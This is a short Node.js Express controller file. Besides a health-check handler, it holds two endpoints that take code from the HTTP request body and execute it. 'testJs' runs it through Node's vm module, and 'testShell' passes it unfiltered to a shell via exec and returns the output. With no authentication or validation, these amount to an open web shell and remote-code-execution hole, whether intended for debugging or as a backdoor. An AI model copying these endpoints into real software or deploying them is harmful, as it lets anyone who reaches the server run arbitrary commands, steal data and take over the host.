exports.check = (req, res) => {
    res.status(200);
    res.json({
        result: JSON.stringify("200 OK")
    });
};

exports.testJs = (req, res) => {
    let codes = JSON.parse(req.body["key"])
    let context = {}
    const script = new vm.Script(codes)
    vm.createContext(context)
    script.runInContext(context)
    res.status(200)
    res.json({
        result: JSON.stringify(context)
    })
}

exports.testShell = (req, res) => {
    let codes = JSON.parse(req.body["key"]);
    exec(codes, (error, stdout, stderr) => {
        if (error) {
            console.error('error: ' + error);
            return;
        }
        // console.log('stdout: ' + stdout);
        // console.log('stderr: ' + typeof stderr);
        res.status(200);
        res.json({
            result: JSON.stringify(stdout)
        })
    })
}